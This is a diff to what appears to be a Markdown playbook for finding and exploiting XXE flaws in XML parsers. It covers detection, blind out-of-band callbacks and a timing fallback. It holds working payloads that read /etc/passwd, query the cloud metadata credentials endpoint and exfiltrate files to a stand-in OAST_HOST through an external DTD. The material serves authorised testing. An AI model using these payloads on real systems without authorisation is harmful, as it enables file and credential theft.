@@ -23,8 +23,10 @@ Prioritize when data is actually returned or exfiltrated. SSRF-to-metadata that 
 ## Detection
 1. Inject a benign entity and reference it where a value is echoed back. If `&xxe;` resolves, the parser expands entities.
 2. **File read test**: define `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, reference it in a field that is reflected in the response.
-3. **Blind / OAST**: if nothing is reflected, point an external entity at your collaborator/OAST host and watch for DNS/HTTP hits. Use a **parameter entity** (`%`) if a normal entity in the DTD fails:
+3. **Blind — OAST is the default proof** (jitter-immune binary hit; time-delay is fallback only). If nothing is reflected, point an external entity at your OAST host and watch for DNS/HTTP hits. Use a **parameter entity** (`%`) if a normal entity in the DTD fails:
    `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://OAST_HOST"> %xxe; ]>`
+   Get a host: `interactsh-client -v` (at `~/go/bin/interactsh-client`) for a live domain, or zero-install public `oast.fun` / `oast.pro`. The pulled external DTD (below) carries file contents back to this host.
+   **Time-delay fallback** (no egress for callbacks): pair each TRUE probe with a zero-delay control, repeat **3×** — report only if all 3 TRUE probes are slow **and** all 3 controls are fast.
 
 ## Exploitation
 - **File retrieval** — inject DOCTYPE + external entity, reference in a reflected field:
@@ -33,7 +35,7 @@ Prioritize when data is actually returned or exfiltrated. SSRF-to-metadata that 
   <stockCheck><productId>&xxe;</productId></stockCheck>
   ```
 - **SSRF / cloud metadata** — `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`.
-- **Blind OOB exfil (external DTD)** — host `malicious.dtd`, then reference it. See reference.md for the full DTD; this exfiltrates file contents to your server.
+- **Blind OOB exfil (external DTD)** — default blind path: host `malicious.dtd` whose parameter entity pulls file contents to your OAST host (from Detection 3), then reference it. See reference.md for the full DTD.
 - **Error-based exfil** — when OOB egress is blocked, force a parse error embedding file contents in the error message (reference.md).
 - **XInclude** — when you don't control the whole document (only a value gets placed into server-side XML):
   ```xml
